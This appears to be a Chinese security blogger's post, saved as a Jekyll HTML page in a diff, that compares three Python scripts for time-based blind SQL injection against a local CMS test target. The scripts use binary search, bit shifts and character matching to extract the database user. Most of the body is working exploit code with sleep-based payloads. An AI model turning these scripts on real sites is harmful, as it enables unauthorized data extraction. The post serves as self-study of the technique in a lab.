@@ -1,0 +1,761 @@
+<!-- Post layout -->
+<!DOCTYPE html>
+<html>
+<head>
+<!-- Introducing the head tag -->
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>SQL注入-失了智的盲注尝试 | sueisok</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="SQL注入-失了智的盲注尝试" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="这两天套娃网上的教程，实现了一下盲注脚本，在寻觅的过程中，看到一个使用MySQL位函数和运算符进行基于时间的高效SQL盲注，使用“右移”运算符(»)，枚举从SQL查询返回值的二进制位" />
+<meta property="og:description" content="这两天套娃网上的教程，实现了一下盲注脚本，在寻觅的过程中，看到一个使用MySQL位函数和运算符进行基于时间的高效SQL盲注，使用“右移”运算符(»)，枚举从SQL查询返回值的二进制位" />
+<link rel="canonical" href="http://localhost:4000/blog/stupid-sqli-blind/" />
+<meta property="og:url" content="http://localhost:4000/blog/stupid-sqli-blind/" />
+<meta property="og:site_name" content="sueisok" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-06-05T15:10:09+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SQL注入-失了智的盲注尝试" />
+<meta name="twitter:site" content="@your_name" />
+<meta name="google-site-verification" content="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"SQL注入-失了智的盲注尝试","dateModified":"2020-06-05T15:10:09+08:00","datePublished":"2020-06-05T15:10:09+08:00","url":"http://localhost:4000/blog/stupid-sqli-blind/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/stupid-sqli-blind/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/banner.png"}},"description":"这两天套娃网上的教程，实现了一下盲注脚本，在寻觅的过程中，看到一个使用MySQL位函数和运算符进行基于时间的高效SQL盲注，使用“右移”运算符(»)，枚举从SQL查询返回值的二进制位","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+<script type="application/ld+json">
+    {
+      "@context": "http://schema.org/",
+      "@type": "Person",
+      "image": /assets/JHON.jpg,
+      "honorificPrefix": "MD.",
+      "name": sueisok,
+      "familyName": Your family name,
+      "honorificSuffix": King,
+      "disambiguatingDescription": Your awesome description,
+      "birthPlace": Your address,
+      "birthDate": Your Date of Birth,
+      "height": XX inches,
+      "gender": Your gender,
+      "memberOf": Your awesome orgranization,
+      "nationality": Your proud nationality,
+      "jobTitle": Your Respectful Position,
+      "knowsAbout": Your awesome Skill,
+      "knowsLanguage": ,
+      "email": ,
+      "url": " http://localhost:4000 ",
+      "test": 
+      "worksFor": {
+        "@type": ,
+        "name": ,
+        "openingHours": ,
+        "priceRange": ,
+        "telephone": ,
+        "image": ,
+        "address": {
+        "@type": ,
+        "addressCountry": ,
+        "addressLocality": ,
+        "addressRegion": 
+         }
+      },
+      "address": {
+        "@type": ,
+        "addressCountry": ,
+        "addressLocality": ,
+        "addressRegion": 
+      },
+      "colleague": [
+        "https://deb108471.dhakaeducationboard.gov.bd",
+        "https://deb113652.dhakaeducationboard.gov.bd",
+        "https://deb110880.dhakaeducationboard.gov.bd"
+      ]
+    }
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-sclable=0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="description" content="Notes,Thoughts and Else" />
+<meta name="keywords" content="123456" />
+
+<!-- preloader -->
+<link rel="stylesheet" href="http://localhost:4000/assets/css/preloader.css">
+
+<!-- Favicon -->
+<link href="/assets/icon.png" rel="shortcut icon" />
+<link href="/assets/icon.png" rel="apple-touch-icon-precomposed" />
+<!-- Android Lolipop Theme Color -->
+<!-- <meta name="theme-color" content="#1464FB"> -->
+<title>SQL注入-失了智的盲注尝试</title>
+<!-- Baidu statistics -->
+
+<!-- Google Analytics -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', '');
+</script>
+
+
+<!-- Android Lolipop Theme Color -->
+<meta name="theme-color" content=" rgb(122,103,138) ">
+</head>
+<body onload="loaderFunc()" data-spy="scroll" data-target="#toc" data-offset="20">
+
+
+<!-- preloader -->
+<div id="loader" class="loader">
+  <div class="artboard">
+    <div class="square"></div>
+    <div class="path">
+      <div class="small-squares">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- end -->
+
+<!-- Top anchor -->
+<a id="htmlup" name="htmlup"></a>
+<!-- Introduce blog post options -->
+
+<header id="post-header" style="background-color:rgb(122,103,138);">
+  <div class="top-center">
+      <div class="logo">
+          <a href="/" title="my awesome webtitle" style="color: white;">sueisok</a>
+      </div>
+      <nav class="top-nav">
+          <ul>
+              
+                <li><a href="/" style="color: white;">Home</a></li>
+              
+                <li><a href="/tags/" style="color: white;">Tags</a></li>
+              
+                <li><a href="/timeline/" style="color: white;">Timeline</a></li>
+              
+                <li><a href="/about/" style="color: white;">About</a></li>
+              
+                <li><a href="/reLink/" style="color: white;">reLink</a></li>
+              
+          </ul>
+      </nav>
+      <div id="top-boot">
+        <a href="javascript:;" id="boot1" style="display:block;" onclick="document.getElementById('boot-area').style.display='block';document.getElementById('boot1').style.display='none';document.getElementById('boot2').style.display='block';"><img src="/assets/boot_white.png" alt=""></a>
+        <a href="javascript:;" id="boot2" style="display: none;" onclick="document.getElementById('boot-area').style.display='none';document.getElementById('boot1').style.display='block';document.getElementById('boot2').style.display='none';"><img src="/assets/boot_white.png" alt=""></a>
+      </div>
+  </div>
+
+</header>
+
+
+<!-- Introducing the mobile dropdown option -->
+<div id="boot-area">
+    <ul>
+        
+          <a href="/"><li>Home</li></a>
+        
+          <a href="/tags/"><li>Tags</li></a>
+        
+          <a href="/timeline/"><li>Timeline</li></a>
+        
+          <a href="/about/"><li>About</li></a>
+        
+          <a href="/reLink/"><li>reLink</li></a>
+        
+    </ul>
+</div>
+
+<!-- Introducing the blog post style -->
+<!-- Version one garbage -->
+<!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
+    <span class="wow fadeInUp" data-wow-delay="0.2s">SQL注入-失了智的盲注尝试</span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
+</div> -->
+
+<!--Version 2 switchable page -->
+
+<div class="post-top" style="background-color:rgb(122,103,138);">
+  <!-- Page width is greater than 800px -->
+  <div class="left-area">
+    
+      <a href="javascript:;" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(122,103,138)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
+      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(122,103,138);"><sapn class="main">No previous page</sapn></span></div>
+    
+  </div>
+  <div class="post-titlearea">
+    <span class="wow fadeInUp" data-wow-delay="0.2s">SQL注入-失了智的盲注尝试</span>
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
+  </div>
+  <div class="right-area">
+    
+      <a href="/blog/sqli-time-based/" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(122,103,138)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
+      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(122,103,138);"><sapn class="main">SQL注入-时间盲注整理</sapn></span></div>
+    
+  </div>
+
+  <!-- Page width is less than 800px -->
+  <div class="post-changearea">
+    
+      <a href="javascript:;" class="leftchange" style="border-right: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span><br>No previous one</span></a>
+    
+    
+      <a href="/blog/sqli-time-based/" class="rightchange" style="border-left: 1px solid rgb(122,103,138);border-bottom: 2px solid rgb(122,103,138);"><span>Next<br><br>SQL注入-时间盲注整理</span></a>
+    
+  </div>
+</div>
+
+
+<div class="markdown-body fadeInUp animated">
+  
+
+    
+      <div class="postpage-subtitle" style="border-left: 8px solid rgb(122,103,138); border-right: 8px solid rgb(122,103,138)">
+        Time Based With Python
+      </div>
+    
+  
+
+  <!-- Article content -->
+ <ul id="markdown-toc">
+  <li><a href="#测试环境" id="markdown-toc-测试环境">测试环境</a></li>
+  <li><a href="#二分の盲注" id="markdown-toc-二分の盲注">二分の盲注</a></li>
+  <li><a href="#左移の盲注" id="markdown-toc-左移の盲注">左移の盲注</a></li>
+  <li><a href="#小小の总结" id="markdown-toc-小小の总结">小小の总结</a></li>
+  <li><a href="#匹配の盲注" id="markdown-toc-匹配の盲注">匹配の盲注</a></li>
+  <li><a href="#refer" id="markdown-toc-refer">Refer</a></li>
+</ul>
+<p>这两天套娃网上的教程，实现了一下盲注脚本，在寻觅的过程中，看到一个<a href="https://www.freebuf.com/articles/web/188029.html">使用MySQL位函数和运算符进行基于时间的高效SQL盲注</a>，使用“右移”运算符(»)，枚举从SQL查询返回值的二进制位</p>
+
+<p>高效厚，高效吗？俺来试一试</p>
+
+<h1 id="测试环境">测试环境</h1>
+
+<p>测试环境是一个cms的sql注入漏洞，来源我就不说了，这里的sql注入就是没有过滤，但是是POST提交的方式，然后我改成了GET的方式，如果是POST的话，就是加一个data={}哈哈哈</p>
+
+<p>这里木有加多线程进去，高速公路上比一比</p>
+
+<h1 id="二分の盲注">二分の盲注</h1>
+
+<p>二分法就是，把一个顺序的区间分为两半，取中间的数，目标大于中间的数就舍弃前半段，目标小于中间的数就舍弃后半段。我这里给的区间是30-150，我先按照我的理解，写了一下二分法盲注：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#二分法
+import requests
+import datetime
+import time
+
+headers={
+'Host': '127.0.0.1',
+'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36',
+'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+'Accept-Encoding': 'gzip, deflate',
+'X-Requested-With': 'XMLHttpRequest',
+'Origin': 'http://127.0.0.1',
+'Connection': 'close',
+'Referer': 'http://127.0.0.1/goods/1.html',
+'Cookie': 'UM_distinctid=1720c8e9f960-0fd572df9b95ed-374c2c08-15f900-1720c8e9f9a7; CNZZDATA1277972876=1114558-1589348573-%7C1589953788; PHPSESSID=hp0i4j6to52gg338ven8c69k8k'
+}
+
+def blind(k,i):
+	realurl = '''http://127.0.0.1/shop/tijiao.html'''
+	payload = '''?guige=s&amp;shuliang=1&amp;id=1)and+if(ord(substr(user(),%d,1))&gt;=%d,sleep(4),1)--''' % (k,i)
+	url = realurl + payload
+	time1 = datetime.datetime.now()
+	r = requests.get(url=url,headers=headers)
+	time2 = datetime.datetime.now()
+	sec = (time2 - time1).seconds
+	return sec
+
+def user_name():
+	name = ''
+	for k in range(1,15):#长度
+		mini=30
+		maxi=150
+		midi= mini+(maxi-mini)//2
+
+		for j in range(1,8):
+			if(blind(k,midi)&lt;3):
+				maxi = midi
+				midi = mini+((midi-mini)//2)
+			else:
+				mini = midi
+				midi = mini+((maxi-midi)//2)
+		name += chr(midi)
+		print('user_name:',name)
+		
+user_name()
+</code></pre></div></div>
+
+<p>用户名root@loacalhost，用时<strong>241.9s</strong></p>
+
+<h1 id="左移の盲注">左移の盲注</h1>
+
+<p><strong>r</strong>的ascii码是114，变二进制是<strong>0111 0010</strong>，分别左移7位、6位看一下</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select 114&gt;&gt;7;
++--------+
+| 114&gt;&gt;7 |
++--------+
+|      0 |
++--------+
+1 row in set (0.00 sec)
+
+mysql&gt; select 114&gt;&gt;6;
++--------+
+| 114&gt;&gt;6 |
++--------+
+|      1 |
++--------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p>字符串的第一位都是0，所以我们只需要核对后七位，也就是从左移6开始</p>
+
+<p>然后按照我的理解，写了一下逐位左移的盲注，感觉写的好傻 啊，已经好久没写代码了，属于头一天写第二天就看不懂那种：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+import datetime
+import time
+
+headers={
+'Host': '127.0.0.1',
+'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36',
+'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+'Accept-Encoding': 'gzip, deflate',
+'X-Requested-With': 'XMLHttpRequest',
+'Origin': 'http://127.0.0.1',
+'Connection': 'close',
+'Referer': 'http://127.0.0.1/goods/1.html',
+'Cookie': 'UM_distinctid=1720c8e9f960-0fd572df9b95ed-374c2c08-15f900-1720c8e9f9a7; CNZZDATA1277972876=1114558-1589348573-%7C1589953788; PHPSESSID=hp0i4j6to52gg338ven8c69k8k'
+}
+
+def blind(k,i,j):
+	realurl = '''http://127.0.0.1/shop/tijiao.html'''
+	payload = '''?guige=s&amp;shuliang=1&amp;id=1)and+if((ascii((substr(user(),%d,1)))+&gt;&gt;+%d)=%d,sleep(4),1)--''' % (k,i,j)
+	url = realurl + payload
+	time1 = datetime.datetime.now()
+	r = requests.get(url=url,headers=headers)
+	time2 = datetime.datetime.now()
+	sec = (time2 - time1).seconds
+	return sec
+
+def user_name():
+	name = ''
+	for k in range(1,15):
+		j = 1
+		for i in range(6,-1,-1):
+			if((j%2)==0):
+				j += 1
+			time_blind=blind(k,i,j)
+			if (time_blind&gt;1):
+				if(i == 0):
+					name += chr(j)
+					break
+				else:
+					j = j * 2 + 1
+			else:
+				if(i == 0):
+					name += chr(j - 1)
+					break
+				else:
+					j = (j - 1) * 2
+		print('user_name:',name)
+
+user_name()
+</code></pre></div></div>
+
+<p>用户名root@loacalhost，用时<strong>247s</strong>(ˉ﹃ˉ)</p>
+
+<h1 id="小小の总结">小小の总结</h1>
+
+<p>🔥为了公平起见，两个延时都是sleep(4)</p>
+
+<p>🔥二分241.9左移247用时差不多，因为二分法是每次除以2，二进制中左移其实也是2倍计算</p>
+
+<p>🔥如果你确定盲注的目标的字符范围，其实有更快的方法，如下</p>
+
+<h1 id="匹配の盲注">匹配の盲注</h1>
+
+<p>先要有一个列表，这里我把我能用到的放了进去，数字，大小写字母，和一个@，然后逐个匹配，如果匹配到了就是他了</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+import datetime
+import time
+
+headers={
+'Host': '127.0.0.1',
+'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36',
+'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+'Accept-Encoding': 'gzip, deflate',
+'X-Requested-With': 'XMLHttpRequest',
+'Origin': 'http://127.0.0.1',
+'Connection': 'close',
+'Referer': 'http://127.0.0.1/goods/1.html',
+'Cookie': 'UM_distinctid=1720c8e9f960-0fd572df9b95ed-374c2c08-15f900-1720c8e9f9a7; CNZZDATA1277972876=1114558-1589348573-%7C1589953788; PHPSESSID=hp0i4j6to52gg338ven8c69k8k'
+}
+
+def user_name():
+	name = ''
+	for i in range(1,15):
+		for j in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@':
+			realurl = '''http://127.0.0.1/shop/tijiao.html'''
+			payload = '''?guige=s&amp;shuliang=1&amp;id=1)and+if(substr(user(),%d,1)='%s',sleep(4),1)--''' % (i,j)
+			url = realurl + payload
+
+			time1 = datetime.datetime.now()
+			r = requests.get(url=url,headers=headers)
+			time2 = datetime.datetime.now()
+
+			sec = (time2 - time1).seconds
+			if sec &gt;= 3:
+				name += j
+				break
+		print('user_name:',name)
+
+user_name()
+</code></pre></div></div>
+
+<p>用户名root@loacalhost，用时<strong>76.8s</strong>不香吗(。・∀・)ノ</p>
+
+<p>ps：但如果你的列表里漏了一些特殊字符，那就漏了，所以还是二分和左移比较靠谱全面</p>
+
+<h1 id="refer">Refer</h1>
+
+<p><a href="fuzhi">https://www.freebuf.com/articles/web/188029.html</a></p>
+
+<p><a href="zhantie">https://www.freebuf.com/articles/web/231741.html</a></p>
+
+  <!-- Introducing the share module -->
+  
+  <div class="social-share-wrapper">
+    <div class="social-share"></div>
+  </div>
+
+
+<!-- share.js -->
+<script src="/assets/js/social-share.min.js"></script>
+<script>
+  socialShare('.social-share', {
+    sites: [
+      
+        'weibo'
+        ,
+        
+      
+        'qq'
+        ,
+        
+      
+        'wechat'
+        
+      
+    ],
+    wechatQrcodeTitle: "Share to WeChat circle",
+    wechatQrcodeHelper: 'I look forward to seeing this article in the circle of friends.'
+  });
+</script>
+
+</div>
+
+<!-- Bottom anchor -->
+<a id="htmldown" name="htmldown"></a>
+<!-- Introducing the comment module -->
+
+
+
+    <section class="post-footer-item comment">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80ODI3Ny8yNDc3MQ=="></div>
+    </section>
+
+    <!-- 来必力City版安装代码 -->
+    <script type="text/javascript">
+       (function(d, s) {
+           var j, e = d.getElementsByTagName(s)[0];
+
+           if (typeof LivereTower === 'function') { return; }
+
+           j = d.createElement(s);
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+
+           e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript>Please activate JavaScript for normal use.</noscript>
+    <!-- City version code installation has been completed -->
+
+
+
+
+
+<!-- Introducing the goto module -->
+<div class="bounceInRight animated go">
+  <a title="Top switch page" class="gototop" href="#htmlup" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Top
+    </div>
+  </a>
+  <a title="At the bottomlivere评论哦" class="gotobottom" href="#htmldown" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Foot
+    </div>
+  </a>
+</div>
+
+<!-- Introduce the module at the bottom of the page -->
+
+<footer id="bottom">
+  <script src="/assets/css/bootstrap.min.css"></script>
+
+<!-- START BREADCRUMBS -->
+<nav aria-label="breadcrumb">
+
+  <ol class="breadcrumb">
+  
+  
+  
+  </ol>
+</nav>
+
+<!-- END BREADCRUMBS -->
+
+
+<div id="breadcrumbs">
+
+<a href="/">Home</a>
+
+  
+    / <a href="/blog/">Blog</a>
+  
+
+  
+    / Stupid sqli blind
+  
+
+</div>
+<style>
+#breadcrumbs {margin-left: 0
+
+      font-size: 10rem;
+      padding: 0.75rem 1rem;
+      margin-bottom: 1rem;
+      list-style: none;
+      background-color: # #fcfcfc;
+      border-radius: 0.25rem;
+
+      content: "";
+      display: table;
+      clear: both;
+
+      float: left;
+
+      display: inline-block;
+      padding-right: 0.5rem;
+      padding-left: 0.5rem;
+      color: #818a91;
+      content: "/";
+
+      text-decoration: underline;
+
+      text-decoration: none;
+
+}
+</style>
+
+  <br>
+  <span>sueisok ©
+  
+  
+  2020
+  <br>
+  Powered by <a href="https://www.jekyll.com/">Jekyll</a> | <a href="https://github.com/JonyBepary/HardCandy-Jekyll-Mod">HardCandy-Jekyll Mod</a></span>
+</footer>
+<link rel="stylesheet" href="/assets/css/style.css">
+<link rel="stylesheet" href="/assets/css/media.css">
+<link rel="stylesheet" href="/assets/css/animate.min.css">
+<link rel="stylesheet" href="/assets/css/pygments/pygments_default.css">
+<link rel="stylesheet" href="/assets/css/github-markdown.css">
+<!-- SNS-icon -->
+<script src="/assets/js/font_856428_y9z6nq7zf5.js"></script>
+<!-- share.css -->
+<link rel="stylesheet" href="/assets/css/share.min.css">
+<!-- font -->
+<link rel="stylesheet" href="/assets/css/font.css">
+<!-- <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Pacifico|Ubuntu|Roboto+Mono|Source+Sans+Pro" rel="stylesheet"> -->
+
+
+
+<!-- Quote the animation effect of wow.js -->
+<script src="/assets/js/wow.js"></script>
+<script>
+    var wow = new WOW({
+        boxClass: 'wow',
+        animateClass: 'animated',
+        // offset: 600,
+        mobile: true,
+        live: true
+    });
+    wow.init();
+</script>
+<!-- Page refreshes back to top -->
+<script>
+    window.onbeforeunload = function(){
+        //The page automatically returns to the top after refreshing
+        document.documentElement.scrollTop = 0;  //ie下
+        document.body.scrollTop = 0;  //非ie
+    }
+</script>
+
+<!-- preloder script -->
+<!-- end -->
+<script>
+//open external links in a new window
+function external_new_window() {
+    for(var c = document.getElementsByTagName("a"), a = 0;a < c.length;a++) {
+    var b = c[a];
+    b.getAttribute("href") && b.hostname !== location.hostname
+    }
+}
+//open PDF links in a new window
+function pdf_new_window ()
+{
+    if (!document.getElementsByTagName) return false;
+    var links = document.getElementsByTagName("a");
+    for (var eleLink=0; eleLink < links.length; eleLink ++) {
+    if ((links[eleLink].href.indexOf('.pdf') !== -1)||(links[eleLink].href.indexOf('.doc') !== -1)||(links[eleLink].href.indexOf('.docx') !== -1)) {
+        links[eleLink].onclick =
+        function() {
+            window.open(this.href);
+            return false;
+        }
+    }
+    }
+}
+pdf_new_window()
+external_new_window();
+</script>
+
+<style>
+.videoWrapper {
+    position: relative;
+    padding-bottom: 56.333%;
+    height: 0;
+    background: black;
+}
+.videoWrapper iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    border: 0;
+}
+</style>
+
+<script>
+function get_youtube_id(url) {
+    var p = /^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/;
+    return (url.match(p)) ? RegExp.$1 : false;
+}
+function vimeo_embed(url,el) {
+    var id = false;
+    $.ajax({
+      url: 'https://vimeo.com/api/oembed.json?url='+url,
+      async: true,
+      success: function(response) {
+        if(response.video_id) {
+          id = response.video_id;
+          if(url.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+          if(url.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+          var theInnerHTML = '<div class="videoWrapper"><iframe src="https://player.vimeo.com/video/'+id+'/?byline=0&title=0&portrait=0';
+          if(autoplay==1) theInnerHTML += '&autoplay=1';
+          if(loop==1) theInnerHTML += '&loop=1';
+          theInnerHTML += '" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>';
+          el.innerHTML = theInnerHTML;
+        }
+      }
+    });
+}
+function video_embed() {
+    var p = document.getElementsByTagName('p');
+    for(var i = 0; i < p.length; i++) {
+        //check if this is an external url (that starts with https:// or http://
+        if (p[i].innerHTML.indexOf("http://") == 0 ||
+            p[i].innerHTML.indexOf("https://") == 0) {
+            var youtube_id = get_youtube_id(p[i].innerHTML);
+            if(youtube_id) {
+                if(p[i].innerHTML.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+                if(p[i].innerHTML.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+                var theInnerHTML = '<div class="videoWrapper"><iframe width="720" height="420" src="https://www.youtube.com/embed/' + youtube_id + '?rel=0&showinfo=0';
+                if(autoplay==1) theInnerHTML += '&autoplay=1';
+                if(loop==1) theInnerHTML += '&loop=1&playlist='+youtube_id+'&version=3';
+                theInnerHTML += '" frameborder="0" allowfullscreen></iframe></div>';
+                p[i].innerHTML = theInnerHTML;
+            }
+            if(p[i].innerHTML.indexOf('vimeo.com') !== -1) {
+                //ask vimeo for the id and place the embed
+                vimeo_embed(p[i].innerHTML,p[i]);
+            }
+        }
+    }
+}
+video_embed();
+
+function mp3_embed() {
+    var p = document.getElementsByTagName('p');
+    for(var i = 0; i < p.length; i++) {
+        if(p[i].innerHTML.indexOf('.mp3') !== -1) {
+            var str = p[i].innerHTML.split('?');
+            if(str.length == 1) str[1] = '';
+            var str1 = str[1];
+            str1 = str1.replace('&','').replace('&','');
+            str1 = str1.replace('autoplay=1','').replace('autoplay=0','');
+            str1 = str1.replace('loop=1','').replace('loop=0','');
+            str1 = str1.replace('controls=0','').replace('controls=1','');
+
+            if (str[0].lastIndexOf('.mp3', str[0].length - 4) === str[0].length - 4 && str1.length == 0) {
+                if(str[1].indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+                if(str[1].indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+                if(str[1].indexOf('controls=0') !== -1) var controls=0; else var controls=1;
+                var newInnerHTML = '<audio';
+                if(autoplay==1) newInnerHTML += ' autoplay';
+                if(loop==1) newInnerHTML += ' loop';
+                if(controls==1) newInnerHTML += ' controls';
+                newInnerHTML += '><source src="'+str[0]+'" type="audio/mpeg">Your browser does not support the audio element.</audio>';
+                p[i].innerHTML = newInnerHTML;
+            }
+        }
+    }
+}
+mp3_embed();
+</script>
+
+
+<!-- preloder script -->
+<script>
+    var preloader = document.getElementById("loader");
+    function loaderFunc(){
+      preloader.style.display = 'none';
+    };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<!-- end -->
+
+</body>
+</html>
